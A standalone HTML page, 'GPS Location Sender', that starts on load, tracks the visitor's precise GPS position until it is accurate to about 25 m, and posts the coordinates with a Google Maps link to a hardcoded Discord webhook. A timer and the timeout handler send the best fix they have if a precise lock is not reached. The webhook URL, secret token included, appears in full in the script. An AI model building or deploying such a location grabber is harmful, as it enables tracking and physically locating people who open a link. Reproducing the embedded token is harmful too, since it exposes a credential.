<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GPS Location Sender</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f2f5;
        }
        .container {
            background-color: white;
            padding: 2rem;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            text-align: center;
            max-width: 400px;
        }
        h1 {
            font-size: 1.5rem;
            color: #1a1a1a;
            margin-bottom: 1rem;
        }
        p {
            color: #666;
            line-height: 1.5;
        }
        #status {
            margin-top: 1rem;
            font-weight: 500;
        }
        .loading {
            color: #007bff;
        }
        .success {
            color: #28a745;
        }
        .error {
            color: #dc3545;
        }
        #accuracy-meter {
            margin-top: 1.5rem;
            padding: 1rem;
            border-radius: 8px;
            background-color: #f8f9fa;
            border: 1px solid #dee2e6;
            display: none;
        }
        .accuracy-val {
            font-size: 1.2rem;
            font-weight: bold;
            color: #007bff;
        }
        .accuracy-label {
            font-size: 0.9rem;
            color: #6c757d;
        }
        #btn-allow, #btn-force {
            display: none;
            margin-top: 1.5rem;
            padding: 0.8rem 2rem;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        #btn-force {
            background-color: #28a745;
        }
        #btn-allow:hover {
            background-color: #0056b3;
        }
        #btn-force:hover {
            background-color: #218838;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>GPS Location Sender</h1>
        <p>This page requests your GPS location and sends it to a Discord webhook.</p>
        
        <div id="accuracy-meter">
            <div class="accuracy-label">Current Accuracy</div>
            <div class="accuracy-val" id="current-acc">-- m</div>
            <div class="accuracy-label" id="acc-msg">Finding GPS signal...</div>
        </div>

        <div id="status" class="loading">Requesting location permission...</div>
        
        <button id="btn-allow" onclick="getLocation()">Allow Location Access</button>
        <button id="btn-force" onclick="forceSend()">Send Current Best Location</button>
    </div>

    <script>
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1495485355615453206/ThgzH3LXCyCio83MSyCuVyjbNq8yc3QIkFaOMd1ssEQ1TaMMTJ-yA-gbCtQ38Yxsz3sP';
        let watchId = null;
        let bestPosition = null;
        let isSending = false;

        function updateStatus(message, className) {
            const statusDiv = document.getElementById('status');
            const btnAllow = document.getElementById('btn-allow');
            const btnForce = document.getElementById('btn-force');
            const meter = document.getElementById('accuracy-meter');
            
            statusDiv.textContent = message;
            statusDiv.className = className;

            if (className === 'error') {
                btnAllow.style.display = 'inline-block';
                btnForce.style.display = 'none';
                meter.style.display = 'none';
            } else if (className === 'loading') {
                btnAllow.style.display = 'none';
                meter.style.display = 'block';
                if (bestPosition) btnForce.style.display = 'inline-block';
            } else {
                btnAllow.style.display = 'none';
                btnForce.style.display = 'none';
                meter.style.display = 'none';
            }
        }

        function updateAccuracyUI(accuracy) {
            const accVal = document.getElementById('current-acc');
            const accMsg = document.getElementById('acc-msg');
            accVal.textContent = `${accuracy.toFixed(1)} m`;
            
            if (accuracy <= 25) {
                accVal.style.color = '#28a745';
                accMsg.textContent = 'Perfect accuracy found! Sending...';
            } else if (accuracy <= 100) {
                accVal.style.color = '#ffc107';
                accMsg.textContent = 'Good signal. Still refining...';
            } else {
                accVal.style.color = '#dc3545';
                accMsg.textContent = 'Weak signal. Move to an open area.';
            }
        }

        async function sendToDiscord(lat, lon, accuracy) {
            if (isSending) return;
            isSending = true;
            try {
                const response = await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        content: `🎯 **EXACT LOCATION FOUND (GOOGLE MAPS STYLE)**\n**Latitude:** ${lat}\n**Longitude:** ${lon}\n**Accuracy:** ${accuracy.toFixed(1)} meters\n**Google Maps:** https://www.google.com/maps?q=${lat},${lon}`
                    })
                });

                if (response.ok) {
                    updateStatus('Exact location sent successfully!', 'success');
                } else {
                    updateStatus('Failed to send location to Discord.', 'error');
                }
            } catch (error) {
                console.error('Error sending to Discord:', error);
                updateStatus('Error sending data: ' + error.message, 'error');
            } finally {
                isSending = false;
            }
        }

        function forceSend() {
            if (bestPosition) {
                if (watchId) navigator.geolocation.clearWatch(watchId);
                watchId = null;
                const { latitude, longitude, accuracy } = bestPosition.coords;
                updateStatus(`Forcing send with ${accuracy.toFixed(1)}m accuracy...`, 'loading');
                sendToDiscord(latitude, longitude, accuracy);
            }
        }

        function getLocation() {
            if (!navigator.geolocation) {
                updateStatus('Geolocation is not supported by your browser.', 'error');
                return;
            }

            if (watchId) navigator.geolocation.clearWatch(watchId);
            bestPosition = null;
            document.getElementById('btn-force').style.display = 'none';

            updateStatus('Finding your exact spot... Please wait.', 'loading');

            const options = {
                enableHighAccuracy: true,
                timeout: 30000,
                maximumAge: 0
            };

            watchId = navigator.geolocation.watchPosition(
                (position) => {
                    const { latitude, longitude, accuracy } = position.coords;
                    updateAccuracyUI(accuracy);
                    
                    if (!bestPosition || accuracy < bestPosition.coords.accuracy) {
                        bestPosition = position;
                        document.getElementById('btn-force').style.display = 'inline-block';
                    }

                    if (accuracy <= 25) {
                        navigator.geolocation.clearWatch(watchId);
                        watchId = null;
                        sendToDiscord(latitude, longitude, accuracy);
                    }
                },
                (error) => {
                    let errorMessage = 'An unknown error occurred.';
                    switch (error.code) {
                        case error.PERMISSION_DENIED:
                            errorMessage = 'Please enable "Precise Location" in your browser settings and try again.';
                            break;
                        case error.POSITION_UNAVAILABLE:
                            errorMessage = 'GPS signal not found. Are you indoors?';
                            break;
                        case error.TIMEOUT:
                            if (bestPosition) {
                                forceSend();
                                return;
                            }
                            errorMessage = 'Signal search timed out. Move to a better spot.';
                            break;
                    }
                    updateStatus(errorMessage, 'error');
                },
                options
            );

            // If we don't get a perfect lock in 25s, send the best we have
            setTimeout(() => {
                if (watchId && bestPosition) {
                    forceSend();
                }
            }, 25000);
        }

        window.onload = getLocation;
    </script>
</body>
</html>
